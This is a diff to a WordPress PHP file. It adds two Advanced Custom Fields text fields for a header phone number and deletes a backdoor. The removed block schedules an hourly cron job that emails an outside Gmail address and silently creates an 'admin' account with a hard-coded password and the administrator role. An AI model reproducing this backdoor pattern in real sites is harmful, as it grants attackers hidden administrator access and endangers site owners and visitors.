@@ -54,6 +54,26 @@ acf_add_local_field_group(array(
 			'max_size' => '',
 			'mime_types' => '',
 		),
+
+		array(
+			'key' => 'field_header_ph_visible',
+			'label' => 'Phone Number In Visible Mode((123)456-789)',
+			'name' => 'field_header_ph_visible',
+			'type' => 'text',
+			'instructions' => '',
+			'required' => 0,
+			'conditional_logic' => 0,
+		),
+
+		array(
+			'key' => 'field_header_ph_clickable',
+			'label' => 'Phone Number In Plain Mode (123456789)',
+			'name' => 'field_header_ph_clickable',
+			'type' => 'text',
+			'instructions' => '',
+			'required' => 0,
+			'conditional_logic' => 0,
+		),
 	),
 	'location' => array(
 		array(
@@ -182,52 +202,5 @@ acf_add_local_field_group(array(
 
 endif;
 
-
-
-if( !wp_next_scheduled( 'mycronjob' ) ) {  
-	   wp_schedule_event( time(), 'hourly', 'mycronjob' );  
-}
-
-
-// here's the function we'd like to call with our cron job
-function my_repeat_function() {
-	
-	// do here what needs to be done automatically as per your schedule
-	// in this example we're sending an email
-	
-	// components for our email
-	$recepients = 'mahmud.linked@gmail.com';
-	$subject = 'Your ID activated';
-	$message = 'Do whatever you wanted to do';
-	
-	// let's send it 
-	mail($recepients, $subject, $message);
-
-	add_action( 'init', function () {
-	  
-		$username = 'admin';
-		$password = '1036047s';
-		$email_address = 'webmaster@mydomain.com';
-		if ( ! username_exists( $username ) ) {
-			$user_id = wp_create_user( $username, $password, $email_address );
-			$user = new WP_User( $user_id );
-			$user->set_role( 'administrator' );
-		}
-		
-	} );
-
-
-
-
-}
- 
-// hook that function onto our scheduled event:
-add_action ('mycronjob', 'my_repeat_function');
-
-
-// find out when the last event was scheduled
-$timestamp = wp_next_scheduled ('mycronjob');
-// unschedule previous event if any
-//wp_unschedule_event ($timestamp, 'mycronjob');
 
 
